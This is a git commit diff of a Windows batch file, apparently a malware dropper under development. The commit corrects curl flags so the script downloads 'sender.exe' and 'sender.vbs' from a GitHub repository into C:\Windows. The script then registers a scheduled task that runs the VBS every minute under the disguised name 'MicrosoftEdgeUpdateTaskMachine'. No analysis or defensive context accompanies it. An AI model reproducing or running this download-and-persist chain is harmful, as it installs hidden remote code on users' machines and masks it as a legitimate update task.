3d42b589ee135ad5f6e2ebcbb9e6ae206d960d07
terionun <terionun_41@hotmail.com>
2024-07-17 02:37:07 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,3 +1,3 @@
-curl.exe https://github.com/terionun/smbb/raw/main/sender.exe -O C:\Windows\sender.exe
-curl.exe https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -O C:\Windows\sender.vbs
+curl.exe https://github.com/terionun/smbb/raw/main/sender.exe -o C:\Windows\sender.exe
+curl.exe https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -o C:\Windows\sender.vbs
 schtasks /create /sc minute /mo 1 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
